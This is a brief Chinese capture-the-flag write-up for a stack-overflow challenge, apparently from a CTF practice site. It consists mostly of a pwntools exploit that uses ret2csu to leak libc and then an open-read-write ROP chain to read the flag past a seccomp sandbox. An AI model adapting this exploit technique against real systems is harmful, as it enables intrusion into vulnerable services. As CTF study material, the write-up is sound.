## 思路

开了沙箱，ret2csu+搓一个orw的ROP链

## EXP

```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'

p=remote('127.0.0.1',9998)
libc=ELF('./libc-2.23.so')
csu1=0x40084a
csu2=0x400830
write_got=0x601018
read_got=0x601030
vuln=0x40074a
flag=0x601160

payload=b'a'*24+p64(csu1)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload+=p64(csu2)+p64(0)*2+p64(1)+p64(read_got)+p64(8)+p64(flag)+p64(0)
payload+=p64(csu2)+p64(0)*7+p64(vuln)
p.sendafter(b'Feel free to ROP~\n',payload)

libcbase=u64(p.recv(8))-libc.symbols['write']
print(hex(libcbase))

pause(1)

p.send(b'./flag\x00\x00')

rdi=libcbase+0x21112
rsi=libcbase+0x202f8
rdx=libcbase+0x1b92
rax=libcbase+0x3a738

payload=b'a'*24
payload+=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(libcbase+libc.symbols['write']+0xe)
payload+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx)+p64(0x30)+p64(libcbase+libc.symbols['read'])
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx)+p64(0x30)+p64(libcbase+libc.symbols['write'])
p.send(payload)

p.interactive()
```

